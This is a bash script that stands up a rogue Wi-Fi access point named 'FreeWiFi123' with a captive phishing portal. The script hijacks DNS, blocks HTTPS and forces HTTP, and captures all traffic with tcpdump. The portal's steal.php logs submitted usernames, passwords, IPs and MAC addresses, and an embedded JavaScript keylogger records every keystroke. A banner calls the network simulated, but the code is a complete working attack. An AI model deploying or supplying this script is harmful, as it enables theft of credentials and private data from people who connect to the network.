#!/bin/bash

echo "[*] Cleaning up..."
sudo pkill create_ap 2>/dev/null
sudo pkill dnsmasq 2>/dev/null
sudo pkill tcpdump 2>/dev/null
sudo iptables -t nat -F
sudo iptables -F
sudo iptables -X

# Reset interfaces
for iface in $(ls /sys/class/net); do
    sudo ip link set $iface down 2>/dev/null
    sudo iw dev $iface set type managed 2>/dev/null
    sudo ip link set $iface up 2>/dev/null
done

# Detect AP-capable Wi-Fi interface
echo "[*] Detecting AP-capable Wi-Fi interface..."
WIFI_INTERFACE=""
for iface in $(ls /sys/class/net); do
    if [[ "$(iw dev "$iface" info 2>/dev/null | grep type | awk '{print $2}')" == "managed" ]]; then
        if iw list 2>/dev/null | grep -A 10 'Supported interface modes' | grep -q AP; then
            WIFI_INTERFACE="$iface"
            echo "[+] Found AP-capable interface: $WIFI_INTERFACE"
            break
        fi
    fi
done

if [ -z "$WIFI_INTERFACE" ]; then
    echo "[!] No suitable Wi-Fi interface found."
    exit 1
fi

FAKE_SSID="FreeWiFi123"
PORTAL_DIR="/var/www/html"
CRED_LOG="$PORTAL_DIR/creds.txt"
KEYLOG="$PORTAL_DIR/keystrokes.txt"
DNSMASQ_LOG="/var/log/dnsmasq.log"
PCAP_LOG="/root/fake_wifi_traffic.pcap"

# Start AP
echo "[*] Starting fake AP..."
sudo create_ap --no-virt -n $WIFI_INTERFACE $FAKE_SSID > /tmp/create_ap.log 2>&1 &
sleep 10
echo "[+] AP launched. Log: /tmp/create_ap.log"

# Detect AP IP from create_ap config
FAKE_IP=$(ip addr show "$WIFI_INTERFACE" | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
echo "[+] Detected AP IP: $FAKE_IP"

# Prepare phishing portal
echo "[*] Installing web interface..."
sudo apt install apache2 dnsmasq tcpdump -y
sudo rm -rf $PORTAL_DIR/*

# Create captive trigger and warning page
cat <<EOF | sudo tee $PORTAL_DIR/index.html > /dev/null
<!DOCTYPE html>
<html>
<head>
<title>Test Network Portal</title>
<style>
body { font-family: Arial; padding: 20px; background: #f2f2f2; }
h1 { color: red; }
</style>
<script>
function logKeystroke(e) {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "/keylog.php", true);
  xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhr.send("key=" + encodeURIComponent(e.key));
}
document.addEventListener("keydown", logKeystroke);
</script>
</head>
<body>
<h1>⚠️ WARNING</h1>
<p>This is a simulated Wi-Fi for cybersecurity testing. <strong>Do not enter real credentials.</strong></p>
<form action="steal.php" method="POST">
Username: <input type="text" name="username" /><br>
Password: <input type="password" name="password" /><br>
<input type="submit" value="Continue">
</form>
</body>
</html>
EOF

# Google/Apple/Windows captive triggers
sudo ln -sf index.html $PORTAL_DIR/generate_204
sudo ln -sf index.html $PORTAL_DIR/hotspot-detect.html
sudo ln -sf index.html $PORTAL_DIR/ncsi.txt

# Credential logger
cat <<EOF | sudo tee $PORTAL_DIR/steal.php > /dev/null
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$mac = shell_exec("arp -an | grep \$ip | awk '{print \$4}'");
\$log = date("c") . " | IP: \$ip | MAC: \$mac | Username: \$_POST[username] | Password: \$_POST[password]\n";
file_put_contents("creds.txt", \$log, FILE_APPEND);
?>
EOF

# Keystroke logger
cat <<EOF | sudo tee $PORTAL_DIR/keylog.php > /dev/null
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$mac = shell_exec("arp -an | grep \$ip | awk '{print \$4}'");
\$log = date("c") . " | IP: \$ip | MAC: \$mac | Key: \$_POST[key]\n";
file_put_contents("keystrokes.txt", \$log, FILE_APPEND);
?>
EOF

echo "[*] Starting Apache..."
sudo systemctl restart apache2

# Force HTTP and block HTTPS
echo "[*] Enforcing captive environment..."
sudo iptables -P FORWARD DROP
sudo iptables -A FORWARD -p tcp --dport 80 -j ACCEPT
sudo iptables -A FORWARD -p udp --dport 53 -j ACCEPT
sudo iptables -t nat -A PREROUTING -i $WIFI_INTERFACE -p tcp --dport 80 -j DNAT --to-destination $FAKE_IP:80
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
sudo iptables -A FORWARD -p tcp --dport 443 -j REJECT

# DNS Hijack
echo "address=/#/$FAKE_IP" | sudo tee /etc/dnsmasq.conf > /dev/null
echo "log-queries" | sudo tee -a /etc/dnsmasq.conf > /dev/null
echo "log-facility=$DNSMASQ_LOG" | sudo tee -a /etc/dnsmasq.conf > /dev/null
sudo systemctl restart dnsmasq

# Start sniffing
echo "[*] Capturing packets on $WIFI_INTERFACE..."
sudo tcpdump -i $WIFI_INTERFACE -w $PCAP_LOG &

echo "[+] Captive fake Wi-Fi '$FAKE_SSID' is active."
echo "[+] Logs: $CRED_LOG (creds), $KEYLOG (keystrokes), $DNSMASQ_LOG (DNS), $PCAP_LOG (traffic)"
